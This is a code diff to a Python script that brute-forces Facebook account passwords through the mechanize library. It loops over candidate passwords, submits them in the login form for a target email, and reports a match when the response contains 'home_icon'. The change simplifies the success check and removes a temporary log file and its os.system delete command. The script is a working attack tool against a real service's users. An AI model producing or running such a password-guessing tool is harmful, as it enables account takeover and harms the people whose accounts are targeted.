@@ -67,28 +67,23 @@ def Main():
                 		             br1.set_handle_robots(False)
                                              br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                 		             op=br1.open("https://facebook.com")
-                		             dos1=open("Facebook-Log.txt","w+")		
+		
                 	                     br1.select_form(nr=0)
                 		             br1.form["email"]=user
                 		             br1.form["pass"]=password
                 		             br1.method="POST"
-                		             br1.submit()
-               			             dos1.write(br1.open("https://facebook.com").read())
-                		             dos1.seek(0)
-                		             text=dos1.read().decode("UTF-8")
-                		             if(text.find("home_icon",0,len(text))!=-1):
-                                                print("\n[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
-                   			        print ("[*] Found! Password is ==> "+ password)
-						dos1.close()
-						os.system("del Facebook-Log.txt || rm Facebook-Log.txt")
-					        exit(1)
+                		             res = br1.submit()
+					     result = res.get_data()
+					     if "home_icon" in result:
+                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                   			        print ("\n[*] Found! Password is ==> "+ password)
+					        break
+						
                 		             else:
                     			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
                     			          lo +=1
             			          except KeyboardInterrupt:
                                                  print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
-						 dos1.close()
-						 os.system("del Facebook-Log.txt || rm Facebook-Log.txt")
 						 exit(1)
      elif check == False:
 		    print("\n[!] Please Check Your Internet Connection !!!")
@@ -96,6 +91,7 @@ def Main():
    else:
 	print(parse.usage)
 	exit(1)
+
 if __name__=='__main__':
 	Main()
 	
